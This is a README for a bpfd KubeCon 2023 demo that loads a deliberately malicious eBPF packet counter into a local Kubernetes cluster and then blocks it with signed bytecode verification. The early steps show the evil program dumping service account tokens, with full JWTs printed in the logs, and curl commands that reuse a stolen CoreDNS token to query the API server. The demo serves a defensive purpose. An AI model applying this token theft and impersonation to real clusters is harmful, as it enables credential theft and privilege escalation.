# [![bpfd](./docs/img/bpfd.svg)](https://bpfd.dev/)

[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![License:
MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![License](https://img.shields.io/badge/License-BSD_2--Clause-orange.svg)](https://opensource.org/licenses/BSD-2-Clause)
[![License: GPL
v2](https://img.shields.io/badge/License-GPL_v2-blue.svg)](https://www.gnu.org/licenses/old-licenses/gpl-2.0.en.html)
![Build status][build-badge] [![Book][book-badge]][book-url]
[![Netlify Status](https://api.netlify.com/api/v1/badges/557ca612-4b7f-480d-a1cc-43b453502992/deploy-status)](https://app.netlify.com/sites/bpfd/deploys)

[build-badge]:
    https://img.shields.io/github/actions/workflow/status/bpfd-dev/bpfd/build.yml?branch=main
[book-badge]: https://img.shields.io/badge/read%20the-book-9cf.svg
[book-url]: https://bpfd.dev/

## Kubecon NA 2023 DEMO branch

** see [bpfd.dev](bpfd.dev) for all project documentation

Pre-requisites:
* A linux machine setup with KIND
* A local Checkout of https://github.com/bpfd-dev/bpfd/tree/kubecon-demo-2023

1. Setup a local KIND cluster

```bash
kind create cluster --name=kubecon-na-2023-bpfd-demo
```

2. Deploy the `go-xdp-counter-evil` application

```bash
kubectl apply -k examples/config/base/go-xdp-counter-evil/
```

3. Verify it's counting packets AND dumping service account tokens

```bash
kubectl logs go-xdp-counter-ds-tm656 -n go-xdp-counter
2023/10/30 13:33:47 Attached XDP program to iface "eth0" (index 2119)
2023/10/30 13:35:05 0 packets received
2023/10/30 13:35:05 0 bytes received

2023/10/30 13:35:08 20 packets received
2023/10/30 13:35:08 3431 bytes received

2023/10/30 13:35:11 20 packets received
2023/10/30 13:35:11 3431 bytes received

2023/10/30 13:35:14 34 packets received
2023/10/30 13:35:14 6089 bytes received

2023/10/30 13:35:15 
pid: 1283939

comm: kube-proxy

token: eyJhbGciOiJSUzI1NiIsImtpZCI6Ii1XWVBBTkVVZXJIc1FsUTNvUkh1dDZkVHlBRXl1Smtaa2VaVTBsU0Q2cncifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMwMjA4NDQyLCJpYXQiOjE2OTg2NzI0NDIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoia3ViZS1wcm94eS1sNmZqYyIsInVpZCI6ImMyYWIzY2JiLTdiMDctNDhiYi1iNzkzLTU5M2QxYjIyZTZlZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoia3ViZS1wcm94eSIsInVpZCI6IjQxZjBkY2Q0LTNkYjgtNGVkYi04NWFhLTkxOGIwODcwOTI5MiJ9LCJ3YXJuYWZ0ZXIiOjE2OTg2NzYwNDl9LCJuYmYiOjE2OTg2NzI0NDIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTprdWJlLXByb3h5In0.apQqLOG571WXwslWfrMOFBiLH7tSgilP0dejOL8QIEeCf-eoIiROkr4fhBgZTZ4Jiojos7EDLl36L3z1eGh8LxGOra5J8AfoFjrSbYxBP_khuUCzz-3Zx9T1X6socopDHSDnx4xbWLiZJd5wAXiUAZpGF1yWVVvgaQqTz5FOVjtGCmy2oJQfXxX6ygMTxR-WreZ6TOWpvdEQP7iQMod7M-BatoCKNP0YoaGDwWKNBj69fA5sqR0z_m2-0kdz7WZ-6Ya3UvY9X-fnr0NbEu8xTTWocYoILn97MzRxnLFIJDs7tURLaMItBvk16a1nHxtI3ykDWr3K2btz53yAC6TOJg

parsed token info: {
   "aud": [
      "https://kubernetes.default.svc.cluster.local"
   ],
   "exp": 1730208442,
   "iat": 1698672442,
   "iss": "https://kubernetes.default.svc.cluster.local",
   "kubernetes.io": {
      "namespace": "kube-system",
      "pod": {
         "name": "kube-proxy-l6fjc",
         "uid": "c2ab3cbb-7b07-48bb-b793-593d1b22e6ef"
      },
      "serviceaccount": {
         "name": "kube-proxy",
         "uid": "41f0dcd4-3db8-4edb-85aa-918b08709292"
      },
      "warnafter": 1698676049
   },
   "nbf": 1698672442,
   "sub": "system:serviceaccount:kube-system:kube-proxy"
}

2023/10/30 13:35:17 34 packets received
2023/10/30 13:35:17 6089 bytes received

...

2023/10/30 13:49:23 63708 packets received
2023/10/30 13:49:23 89972485 bytes received

2023/10/30 13:49:24 
pid: 1284470

comm: coredns

token: eyJhbGciOiJSUzI1NiIsImtpZCI6Ii1XWVBBTkVVZXJIc1FsUTNvUkh1dDZkVHlBRXl1Smtaa2VaVTBsU0Q2cncifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzMwMjA4NDQ2LCJpYXQiOjE2OTg2NzI0NDYsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoiY29yZWRucy01ZDc4Yzk4NjlkLThmZDViIiwidWlkIjoiZWU3ZWU3ODMtOGQ5OC00ZWM5LThhMmEtODM5ODYzZGE4MzViIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjb3JlZG5zIiwidWlkIjoiMmY3MzBiYWUtZmJlNS00ZDc4LTgwOTAtNzIxYjA4MGRhMTk4In0sIndhcm5hZnRlciI6MTY5ODY3NjA1M30sIm5iZiI6MTY5ODY3MjQ0Niwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmNvcmVkbnMifQ.au_2Zfd_XnzwMd_SAoIQ_6guowMAUMoHzdJ7RTC3XxqOJNWAZoWDAAs6Xj2gJDRPAknrMqZjRu7HkpoQO5d4gstNZlHtUrNdKzvYGyc3886cwQlXZK_JzjZQZIyfIsc-9ELl8gDlZpba7yc0waXYznQUtc9cZ7xZg-ahIHlBEYX6o9qW0qw6uOHG7sRVXS5XZtjO_RWUsheX1r42kgLYeaI-_t76qOKu3c76s8Wrv_KIE3O2cSChhgO8IFgvceSvjMXtED6_-wKEt96Upsm1CtzoS8OpSkTfCgtLqG-epT-HY4X7RbZTI8DXRnUFulgqaaUgFzioQqaut8hvkFLnoA

parsed token info: {
   "aud": [
      "https://kubernetes.default.svc.cluster.local"
   ],
   "exp": 1730208446,
   "iat": 1698672446,
   "iss": "https://kubernetes.default.svc.cluster.local",
   "kubernetes.io": {
      "namespace": "kube-system",
      "pod": {
         "name": "coredns-5d78c9869d-8fd5b",
         "uid": "ee7ee783-8d98-4ec9-8a2a-839863da835b"
      },
      "serviceaccount": {
         "name": "coredns",
         "uid": "2f730bae-fbe5-4d78-8090-721b080da198"
      },
      "warnafter": 1698676053
   },
   "nbf": 1698672446,
   "sub": "system:serviceaccount:kube-system:coredns"
}

2023/10/30 13:49:26 63708 packets received
2023/10/30 13:49:26 89972485 bytes received
```

4. Exec into the evil pod and make kube api requests on behalf of another pod's service account (in this case `core-dns`'s).

- Use our pod's SA token

```bash
bash-5.2# curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer <OUR TOKEN>" https://kubernetes.default/api/v1/nodes/demo-control-plane
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {},
  "status": "Failure",
  "message": "nodes \"kubecon-na-2023-bpfd-demo\" is forbidden: User \"system:serviceaccount:go-xdp-counter:default\" cannot get resource \"nodes\" in API group \"\" at the cluster scope",
  "reason": "Forbidden",
  "details": {
    "name": "kubecon-na-2023-bpfd-demo",
    "kind": "nodes"
  },
  "code": 403
}
```

- Use CoreDNS pod's token from same pod

```bash
bash-5.2# curl --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H "Authorization: Bearer <CORE DNS TOKEN>" https://kubernetes.default/api/v1/nodes/kubecon-na-2023-bpfd-demo-control-plane
{
  "kind": "Node",
  "apiVersion": "v1",
  "metadata": {
    "name": "kubecon-na-2023-bpfd-demo-control-plane",
    "uid": "3489ccf9-9fec-4bfa-b6e8-20860e630d6b",
    "resourceVersion": "4438",
    "creationTimestamp": "2023-10-30T13:27:04Z",
    "labels": {
      "beta.kubernetes.io/arch": "amd64",
      "beta.kubernetes.io/os": "linux",
      "kubernetes.io/arch": "amd64",
      "kubernetes.io/hostname": "kubecon-na-2023-bpfd-demo-control-plane",
      "kubernetes.io/os": "linux",
      "node-role.kubernetes.io/control-plane": "",
      "node.kubernetes.io/exclude-from-external-load-balancers": ""
    },
    "annotations": {
      "kubeadm.alpha.kubernetes.io/cri-socket": "unix:///run/containerd/containerd.sock",
      "node.alpha.kubernetes.io/ttl": "0",
      "volumes.kubernetes.io/controller-managed-attach-detach": "true"
    },
   ...
  ```


5. Install bpfd from the v0.3.0 release 

```bash
kubectl apply -f  https://github.com/bpfd-dev/bpfd/releases/download/v0.3.0/bpfd-crds-install-v0.3.0.yaml
kubectl apply -f https://github.com/bpfd-dev/bpfd/releases/download/v0.3.0/bpfd-operator-install-v0.3.0.yaml
```

6. Find a malicious program

```bash
kubectl get bpfprogram -l kubernetes.io/hostname=kubecon-na-2023-bpfd-demo-control-plane
NAME                                                         AGE
dump-bpf-map-316-kubecon-na-2023-bpfd-demo-control-plane     45m
dump-bpf-prog-317-kubecon-na-2023-bpfd-demo-control-plane    45m
enter-openat-40337-kubecon-na-2023-bpfd-demo-control-plane   45m  -------> EVIL
enter-read-40338-kubecon-na-2023-bpfd-demo-control-plane     45m  -------> EVIL
exit-openat-40339-kubecon-na-2023-bpfd-demo-control-plane    45m  -------> EVIL
exit-read-40340-kubecon-na-2023-bpfd-demo-control-plane      45m  -------> EVIL 
restrict-filesy-45-kubecon-na-2023-bpfd-demo-control-plane   45m
sd-devices-132-kubecon-na-2023-bpfd-demo-control-plane       45m
sd-devices-133-kubecon-na-2023-bpfd-demo-control-plane       45m
sd-devices-134-kubecon-na-2023-bpfd-demo-control-plane       45m
sd-devices-135-kubecon-na-2023-bpfd-demo-control-plane       45m
sd-devices-138-kubecon-na-2023-bpfd-demo-control-plane       45m
sd-devices-141-kubecon-na-2023-bpfd-demo-control-plane       45m
sd-fw-egress-136-kubecon-na-2023-bpfd-demo-control-plane     45m
sd-fw-egress-139-kubecon-na-2023-bpfd-demo-control-plane     45m
sd-fw-egress-142-kubecon-na-2023-bpfd-demo-control-plane     45m
sd-fw-egress-144-kubecon-na-2023-bpfd-demo-control-plane     45m
sd-fw-ingress-137-kubecon-na-2023-bpfd-demo-control-plane    45m
sd-fw-ingress-140-kubecon-na-2023-bpfd-demo-control-plane    45m
sd-fw-ingress-143-kubecon-na-2023-bpfd-demo-control-plane    45m
sd-fw-ingress-145-kubecon-na-2023-bpfd-demo-control-plane    45m
xdp-stats-40341-kubecon-na-2023-bpfd-demo-control-plane      45m
```

7. Delete the malicious loading deployment

```bash
kubectl delete ns go-xdp-counter
```

8. Activate the CSI feature via the bpfd configmap

```bash
kubectl edit cm bpfd-config -n bpfd

apiVersion: v1
data:
  bpfd.agent.image: quay.io/bpfd/bpfd-agent:latest
  bpfd.agent.log.level: info
  bpfd.enable.csi: "true". <------  ENABLE THE CSI FEATURE
  bpfd.image: quay.io/bpfd/bpfd:latest
  bpfd.log.level: info
  bpfd.toml: |
    [[grpc.endpoints]]
    type = "unix"
    path = "/bpfd-sock/bpfd.sock"
    enabled = true
kind: ConfigMap
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"v1","data":{"bpfd.agent.image":"quay.io/bpfd/bpfd-agent:latest","bpfd.agent.log.level":"info","bpfd.image":"quay.io/bpfd/bpfd>
  creationTimestamp: "2023-11-02T16:04:34Z"
  finalizers:
  - bpfd.dev.operator/finalizer
  name: bpfd-config
  namespace: bpfd
  resourceVersion: "1438"
  uid: ea93cb3c-801c-4b81-be94-014910f1d3ee
```

9. Deploy the go-xdp-counter with bpfd

```bash
cd examples && make deploy-xdp-evil-bc
sed 's@URL_BC@quay.io/bpfd-bytecode/go-xdp-counter-evil:latest@' config/default/go-xdp-counter/patch.yaml.env > config/default/go-xdp-counter/patch.yaml
cd config/default/go-xdp-counter && /home/astoycos/go/src/github.com/bpfd-dev/bpfd/examples/bin/kustomize edit set image quay.io/bpfd-userspace/go-xdp-counter=quay.io/bpfd-userspace/go-xdp-counter:latest
/home/astoycos/go/src/github.com/bpfd-dev/bpfd/examples/bin/kustomize build config/default/go-xdp-counter | kubectl apply -f -
namespace/go-xdp-counter created
serviceaccount/bpfd-app-go-xdp-counter created
clusterrolebinding.rbac.authorization.k8s.io/bpfd-app-rolebinding-go-xdp-counter created
clusterrolebinding.rbac.authorization.k8s.io/privileged-scc-xdp created
daemonset.apps/go-xdp-counter-ds created
xdpprogram.bpfd.dev/go-xdp-counter-example created
```

10. Ensure the xdp-counter is ONLY counting packets now

```bash
kubectl logs go-xdp-counter-ds-kbnjh -n go-xdp-counter
2023/11/08 18:13:19 1 packets received
2023/11/08 18:13:19 86 bytes received

2023/11/08 18:13:22 1 packets received
2023/11/08 18:13:22 86 bytes received

2023/11/08 18:13:25 2 packets received
2023/11/08 18:13:25 164 bytes received

2023/11/08 18:13:28 2 packets received
2023/11/08 18:13:28 164 bytes received
...
```

11. Inspect the new XdpProgram Object

```bash
kubectl get xdpprogram go-xdp-counter-example -o yaml
apiVersion: bpfd.dev/v1alpha1
kind: XdpProgram
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"bpfd.dev/v1alpha1","kind":"XdpProgram","metadata":{"annotations":{},"labels":{"app.kubernetes.io/name":"xdpprogram"},"name":"go-xdp-counter-example"},"spec":{"bpffunctionname":"xdp_stats","bytecode":{"image":{"url":"quay.io/bpfd-bytecode/go-xdp-counter-evil:latest"}},"interfaceselector":{"primarynodeinterface":true},"nodeselector":{},"priority":55}}
  creationTimestamp: "2023-11-08T18:13:12Z"
  finalizers:
  - bpfd.dev.operator/finalizer
  generation: 2
  labels:
    app.kubernetes.io/name: xdpprogram
  name: go-xdp-counter-example
  resourceVersion: "946434"
  uid: cf67ffec-1254-45e1-b2d3-9b055890beca
spec:
  bpffunctionname: xdp_stats
  bytecode:
    image:
      imagepullpolicy: IfNotPresent
      url: quay.io/bpfd-bytecode/go-xdp-counter-evil:latest.  --------> Bytecode is still evil!
  interfaceselector:
    primarynodeinterface: true
  mapownerselector: {}
  nodeselector: {}
  priority: 55
  proceedon:
  - pass
  - dispatcher_return
status:
  conditions:
  - lastTransitionTime: "2023-11-08T18:13:14Z"
    message: bpfProgramReconciliation Succeeded on all nodes
    reason: ReconcileSuccess
    status: "True"
    type: ReconcileSuccess
```

12. Show that the evil bytecode is unsigned

```bash
kubectl logs bpfd-daemon-lc42f -n bpfd
Defaulted container "bpfd" out of: bpfd, bpfd-agent, node-driver-registrar
[INFO  bpfd] Log using env_logger
[INFO  bpfd] Has CAP_BPF: true
[INFO  bpfd] Has CAP_SYS_ADMIN: true
[INFO  bpfd::certs] CA Certificate file /etc/bpfd/certs/ca/ca.pem does not exist. Creating CA Certificate.
[INFO  bpfd::certs] bpfd Certificate Key /etc/bpfd/certs/bpfd/bpfd.key does not exist. Creating bpfd Certificate.
[INFO  bpfd::certs] bpfd-client Certificate Key /etc/bpfd/certs/bpfd-client/bpfd-client.key does not exist. Creating bpfd-client Certificate.
[INFO  bpfd::oci_utils::cosign] Starting Cosign Verifier, downloading data from Sigstore TUF repository
[INFO  bpfd::serve] Listening on /bpfd-sock/bpfd.sock
[INFO  bpfd::storage] CSI Plugin Listening on /run/bpfd/csi/csi.sock
[WARN  bpfd::oci_utils::cosign] The bytecode image: quay.io/bpfd-bytecode/go-xdp-counter-evil:latest is unsigned
[INFO  bpfd::command] Loading program bytecode from container image: quay.io/bpfd-bytecode/go-xdp-counter-evil:latest
[INFO  bpfd::oci_utils::cosign] The bytecode image: quay.io/bpfd/xdp-dispatcher:v2 is signed
[INFO  bpfd::bpf] Added xdp program with name: xdp_stats and id: 41668
```

13. Update the Xdprogram object with a signed bytecode image

```bash
kubectl edit xdpprogram go-xdp-counter-example

apiVersion: bpfd.dev/v1alpha1
kind: XdpProgram
metadata:
  annotations:
    kubectl.kubernetes.io/last-applied-configuration: |
      {"apiVersion":"bpfd.dev/v1alpha1","kind":"XdpProgram","metadata":{"annotations":{},"labels":{"app.kubernetes.io/name":"xdpprogram"},"name":">
  creationTimestamp: "2023-11-08T18:13:12Z"
  finalizers:
  - bpfd.dev.operator/finalizer
  generation: 3
  labels:
    app.kubernetes.io/name: xdpprogram
  name: go-xdp-counter-example
  resourceVersion: "947775"
  uid: cf67ffec-1254-45e1-b2d3-9b055890beca
spec:
  bpffunctionname: xdp_stats
  bytecode:
    image:
      imagepullpolicy: IfNotPresent
      url: quay.io/bpfd-bytecode/go-xdp-counter:latest. --------> CHANGE TO SIGNED IMAGE
  interfaceselector:
    primarynodeinterface: true
  mapownerselector: {}
  nodeselector: {}
  priority: 55
  proceedon:
  - pass
  - dispatcher_return
status:
  conditions:
  - lastTransitionTime: "2023-11-08T18:13:14Z"
    message: bpfProgramReconciliation Succeeded on all nodes
    reason: ReconcileSuccess
    status: "True"
    type: ReconcileSuccess
```

14. Show that bpfd verified it's signiture

```bash
kubectl logs bpfd-daemon-lc42f -n bpfd
Defaulted container "bpfd" out of: bpfd, bpfd-agent, node-driver-registrar
[INFO  bpfd] Log using env_logger
[INFO  bpfd] Has CAP_BPF: true
[INFO  bpfd] Has CAP_SYS_ADMIN: true
[INFO  bpfd::certs] CA Certificate file /etc/bpfd/certs/ca/ca.pem does not exist. Creating CA Certificate.
[INFO  bpfd::certs] bpfd Certificate Key /etc/bpfd/certs/bpfd/bpfd.key does not exist. Creating bpfd Certificate.
[INFO  bpfd::certs] bpfd-client Certificate Key /etc/bpfd/certs/bpfd-client/bpfd-client.key does not exist. Creating bpfd-client Certificate.
[INFO  bpfd::oci_utils::cosign] Starting Cosign Verifier, downloading data from Sigstore TUF repository
[INFO  bpfd::serve] Listening on /bpfd-sock/bpfd.sock
[INFO  bpfd::storage] CSI Plugin Listening on /run/bpfd/csi/csi.sock
[WARN  bpfd::oci_utils::cosign] The bytecode image: quay.io/bpfd-bytecode/go-xdp-counter-evil:latest is unsigned
[INFO  bpfd::command] Loading program bytecode from container image: quay.io/bpfd-bytecode/go-xdp-counter-evil:latest
[INFO  bpfd::oci_utils::cosign] The bytecode image: quay.io/bpfd/xdp-dispatcher:v2 is signed
[INFO  bpfd::bpf] Added xdp program with name: xdp_stats and id: 41668
[INFO  bpfd::bpf] Removing program with id: 41668
[INFO  bpfd::oci_utils::cosign] The bytecode image: quay.io/bpfd-bytecode/go-xdp-counter:latest is signed ----> SIGNED BYTECODE IMAGE
[INFO  bpfd::command] Loading program bytecode from container image: quay.io/bpfd-bytecode/go-xdp-counter:latest
[INFO  bpfd::oci_utils::cosign] The bytecode image: quay.io/bpfd/xdp-dispatcher:v2 is signed
[INFO  bpfd::bpf] Added xdp program with name: xdp_stats and id: 41674
```

## License

With the exception of eBPF code, everything is distributed under the terms of
either the [MIT license] or the [Apache License] (version 2.0), at your option.

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this crate by you, as defined in the Apache-2.0 license, shall
be dual licensed as above, without any additional terms or conditions.

### eBPF

All [eBPF code](./bpf) is distributed under the terms of the [GNU General Public
License, Version 2] or the [BSD 2 Clause] license, at your option.

Unless you explicitly state otherwise, any contribution intentionally submitted
for inclusion in this project by you, as defined in the GPL-2 license, shall be
dual licensed as above, without any additional terms or conditions.

[MIT license]: LICENSE-MIT
[Apache license]: LICENSE-APACHE
[GNU General Public License, Version 2]: LICENSE-GPL2
[BSD 2 Clause]: LICENSE-BSD2
